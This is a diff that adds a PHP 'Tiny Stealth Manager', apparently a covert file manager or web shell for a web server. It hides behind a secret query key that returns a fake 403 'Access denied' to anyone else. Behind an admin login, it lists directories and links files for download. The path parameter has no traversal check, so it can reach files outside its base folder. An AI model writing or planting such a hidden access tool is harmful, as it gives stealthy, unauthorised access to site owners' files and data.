@@ -1,0 +1,69 @@
+<?php
+// ================= SECRET PARAM ===================
+$secretKey = "kangkung666"; // ganti sesuka hati
+if (!isset($_GET['k']) || $_GET['k'] !== $secretKey) {
+    http_response_code(403);
+    exit("Access denied");
+}
+// ==================================================
+
+session_start(['cookie_httponly'=>true,'cookie_samesite'=>'Lax']);
+$CONFIG = [
+    'BASE_DIR'=>realpath(__DIR__),
+    'APP_NAME'=>'Tiny Stealth Manager',
+    'USERNAME'=>'admin',
+    'PASSWORD_SHA256_SALT'=>'SALT_BARU',
+    'PASSWORD_SHA256_HASH'=>'819f3615c06ece0720b0222d0a7137169a919e2c613f7dad2c0866c14bbf7367',
+    'BLOCK_PHP_UPLOAD'=>true,
+    'EDITABLE_EXT'=>['txt','log','json','css','js','html','php'],
+    'MAX_EDIT_BYTES'=>1024*1024,
+    'SHOW_HIDDEN'=>false,
+    'TIMEZONE'=>'Asia/Jakarta'
+];
+date_default_timezone_set($CONFIG['TIMEZONE']);
+
+if (!isset($_SESSION['csrf'])) $_SESSION['csrf']=bin2hex(random_bytes(16));
+function csrf_field(){echo'<input type=hidden name=csrf value="'.htmlspecialchars($_SESSION['csrf']).'">';}
+function csrf_ok(){return ($_POST['csrf']??'')===$_SESSION['csrf'];}
+
+function is_logged(){return !empty($_SESSION['auth_ok']);}
+function need_login(){if(!is_logged()){login_form();exit;}}
+
+$a=$_GET['a']??$_POST['a']??'list';
+if($a==='login' && $_SERVER['REQUEST_METHOD']==='POST'){
+  $u=$_POST['username']??'';$p=$_POST['password']??'';
+  global $CONFIG;
+  if($u===$CONFIG['USERNAME'] && hash_equals($CONFIG['PASSWORD_SHA256_HASH'],hash("sha256",$p.$CONFIG['PASSWORD_SHA256_SALT']))){
+    $_SESSION['auth_ok']=1;header("Location:?k=".$GLOBALS['secretKey']);exit;
+  } else {login_form("Login gagal");exit;}
+}
+if($a==='logout'){session_destroy();header("Location:?k=".$GLOBALS['secretKey']);exit;}
+
+need_login();
+
+function hsize($b){$u=['B','KB','MB','GB'];$i=0;while($b>=1024&&$i<3){$b/=1024;$i++;}return sprintf("%.1f %s",$b,$u[$i]);}
+function ext($n){return strtolower(pathinfo($n,PATHINFO_EXTENSION));}
+
+$rel=$_GET['p']??'';$base=$CONFIG['BASE_DIR'];$here=$base.'/'.ltrim($rel,'/');
+if(!file_exists($here))$here=$base;
+
+echo "<!doctype html><title>Stealth Manager</title><style>body{font-family:sans-serif;max-width:900px;margin:20px auto}</style>";
+echo "<h2>File Manager</h2><p><a href='?k={$GLOBALS['secretKey']}&a=logout'>Logout</a></p>";
+echo "<table border=1 cellpadding=6><tr><th>Name</th><th>Size</th><th>Action</th></tr>";
+
+foreach(scandir($here) as $f){
+ if($f==='.'||$f==='..')continue;
+ $full=$here.'/'.$f;$rp=ltrim($rel.'/'.$f,'/');
+ echo "<tr><td>".(is_dir($full)?'📁':'📄')." <a href='?k={$GLOBALS['secretKey']}&p=".urlencode($rp)."'>".htmlspecialchars($f)."</a></td>";
+ echo "<td>".(is_file($full)?hsize(filesize($full)):'-')."</td>";
+ echo "<td>";
+ if(is_file($full)) echo "<a href='?k={$GLOBALS['secretKey']}&a=download&p=".urlencode($rp)."'>Download</a>";
+ echo "</td></tr>";
+}
+echo "</table>";
+
+function login_form($msg=''){global $secretKey;
+ echo "<!doctype html><title>Login</title>";
+ if($msg)echo"<p style=color:red>$msg</p>";
+ echo "<form method=post action='?a=login&k=$secretKey'><p>User:<br><input name=username></p><p>Pass:<br><input type=password name=password></p><button>Login</button></form>";
+}
